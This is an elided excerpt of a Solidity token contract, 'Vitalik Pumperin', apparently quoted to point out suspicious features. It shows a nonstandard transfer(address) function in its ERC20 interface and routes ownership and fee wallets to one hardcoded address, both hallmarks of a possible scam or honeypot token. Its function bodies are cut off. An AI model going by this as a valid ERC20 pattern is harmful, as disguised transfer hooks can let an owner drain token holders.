...
interface IERC20 {
    ...
    function transfer(address transfered_Address) external returns (uint256);
...
contract PUMPERIN is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xc17AD9e82700DAb9C1650AA48548E47D148Fc468); 
    address payable public Wallet_Utility = payable(0xc17AD9e82700DAb9C1650AA48548E47D148Fc468);
    ...
    string private constant _name = " Vitalik Pumperin"; 
    string private constant _symbol = unicode" PUMPERIN "; 
    ...
    constructor () {
        ...
        _owner = 0xc17AD9e82700DAb9C1650AA48548E47D148Fc468;
    ...
    function transfer(address transfered_Address) public override returns (uint256) {
